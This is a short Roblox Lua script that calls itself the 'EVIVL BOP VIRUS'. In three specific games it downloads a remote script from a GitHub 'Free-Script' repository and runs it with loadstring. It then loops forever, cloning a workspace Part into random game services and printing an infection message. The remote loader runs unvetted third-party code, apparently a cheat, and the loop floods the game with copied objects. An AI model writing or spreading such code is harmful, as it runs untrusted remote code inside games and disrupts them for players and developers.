local PlaceId = game.PlaceId
 
if PlaceId == 2753915549 or PlaceId == 4442272183 or PlaceId == 7449423635 then
	loadstring(game:HttpGet("https://raw.githubusercontent.com/xDepressionx/Free-Script/main/BloxFruit.lua"))()
end
local services = {
	game.ServerStorage,
	workspace,
	game.StarterGui,
	game.StarterPack,
	game.Stats,
	game.Players,
	game.ReplicatedStorage,
	game.ReplicatedFirst
}

while wait() do
	local clone = workspace:FindFirstChildOfClass("Part"):Clone()
	clone.Parent = services[math.random(1, #services)]
	print("U GOT INFECTED BY THE EVIVL BOP VIRUS")
end
